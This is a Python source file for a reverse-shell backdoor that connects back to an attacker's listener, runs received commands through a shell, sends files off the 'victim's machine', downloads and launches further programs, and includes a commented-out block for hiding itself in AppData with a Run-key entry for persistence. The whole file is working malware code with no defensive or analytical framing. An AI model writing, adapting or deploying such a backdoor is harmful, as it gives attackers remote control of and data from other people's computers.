import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests


##hiding backdoor and creating persistent
##copy backdoor 'Appdata' in case of windows only in linux dist it doesnt exist change accordingly

'''
location = os.environ("appdata") + "\\" + "windows32.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable ,location)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d"' + location + '"' + shell=True)
'''

sock_object = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
##should be the public ip of the attackers machine

##Method to connect back to the server after every 20 secs
def connect_back():
    while True:
        time.sleep(20)
        try:
            sock_object.connect(("127.0.0.1" ,54320))
            shell()
        except:
            connect_back()

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]

    with open(file_name ,"wb") as output_file:
        output_file.write(get_response.content)

def send_over_json(data):
    json_data = json.dumps(data)
    sock_object.send(json_data.encode('utf-8'))

def recv_over_json():
    data = ""
    while True:
        try:
            data = data + sock_object.recv(1024).decode('utf-8')
            return json.loads(data)
        except ValueError:
            continue
def shell():
    while True:
        command = recv_over_json()
        if command == 'q':
            break
        elif command[:2] == 'cd':
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == 'download':
            with open(command[9:] ,'rb' ) as file:
                send_over_json(file.read())
        elif command[:6] == 'upload':
            with open(command[7:] ,'wb') as file:
                file_data = recv_over_json()
                file.write(base64.b64decode(file_data))
        elif command[:3] == "get":
            try:
                download(command[4:])
                send_over_json("[+] Downloaded File From Specified URL")
            except:
                send_over_json("[+] Failed to download that file")
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:] ,shell=True)
                send_over_json("[+] %s started on victim's machine."%(command[6:]))
            except:
                send_over_json("[-] %s failed to start on victim's machine. "%(command[6:]))
        else:
            proc = subprocess.Popen(command ,shell=True ,stdout=subprocess.PIPE ,stderr=subprocess.PIPE ,stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            send_over_json(result.decode('utf-8'))

connect_back()

##close the socket
sock_object.close()